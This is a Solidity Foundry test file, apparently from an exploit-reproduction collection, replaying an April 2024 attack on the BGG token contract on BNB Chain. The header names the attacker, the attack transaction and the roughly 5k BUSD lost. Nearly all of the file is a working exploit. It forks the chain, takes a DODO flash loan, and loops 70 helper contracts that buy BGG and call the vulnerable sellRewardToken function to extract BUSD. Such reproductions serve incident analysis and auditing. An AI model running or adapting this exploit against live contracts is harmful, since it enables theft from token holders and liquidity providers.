// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~5k $BUSD
// Attacker : https://bscscan.com/address/0xc1b6f9898576d722dbf604aaa452cfea3a639c59
// Attack Contract : https://bscscan.com/address/0xb22cf0e1672344f23f3126fbd35f856e961fd780
// Vulnerable Contract : https://bscscan.com/address/0xa45d4359246dbd523ab690bef01da06b07450030
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0x94055664287a565d4867a97ba6d5d2e28c55d10846e3f83355ba84bd1b9280fc

// @Analysis
// https://x.com/DecurityHQ/status/1778075039293727143
// https://x.com/0xNickLFranklin/status/1778237524558970889

import "forge-std/Test.sol";
import "./../interface.sol";

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface ITransparentUpgradeableProxy {
    function sellRewardToken(uint256 amuont) external;
}


contract ContractTest is Test {

    IERC20 BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair BUSD_BGG_LpPool_Pancake = IPancakePair(0x218674fc1df16B5d4F0227A59a2796f13FEbC5f2);
    IPancakePair BUSD_BGG_LpPool_SwapRouter = IPancakePair(0x68E465A8E65521631f36404D9fB0A6FaD62A3B37);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    ITransparentUpgradeableProxy TransparentUpgradeableProxy = ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    AttackContract attackContract;

    function setUp() public {
        vm.createSelectFork("bsc", 37_740_105 - 1);
        vm.label(address(BGG), "BGG");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BUSD_BGG_LpPool_Pancake), "BUSD_BGG_LpPool_Pancake");
        vm.label(address(BUSD_BGG_LpPool_SwapRouter), "BUSD_BGG_LpPool_SwapRouter");
        vm.label(address(Router), "Router");
        vm.label(address(DODO), "DODO");
    }

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));

        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);

        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
        DODO.flashLoan(50 * 1e18, 0, address(this), new bytes(1));
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        for (uint256 i = 0; i < 70; i++) {
            attackContract = new AttackContract();
            BUSD.transfer(address(attackContract), 15 * 1e18);
            attackContract.Attack();
            attackContract.Claim();
        }
        BUSD.transfer(address(DODO), 50 * 1e18);
    }

    fallback() external payable {}
    receive () external payable {}
}


contract AttackContract {
    IERC20 BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair BUSD_BGG_LpPool_Pancake = IPancakePair(0x218674fc1df16B5d4F0227A59a2796f13FEbC5f2);
    IPancakePair BUSD_BGG_LpPool_SwapRouter = IPancakePair(0x68E465A8E65521631f36404D9fB0A6FaD62A3B37);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    ITransparentUpgradeableProxy TransparentUpgradeableProxy = ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    address owner;

    constructor() {
        owner = msg.sender;
        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    function Attack() external onlyOwner{
        BUSDTOTOKEN();
        TransparentUpgradeableProxy.sellRewardToken(BGG.balanceOf(address(this)));
    }

    function Claim() external onlyOwner{
        BUSD.transfer(owner, BUSD.balanceOf(address(this)));
    }

    function BUSDTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(BGG);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
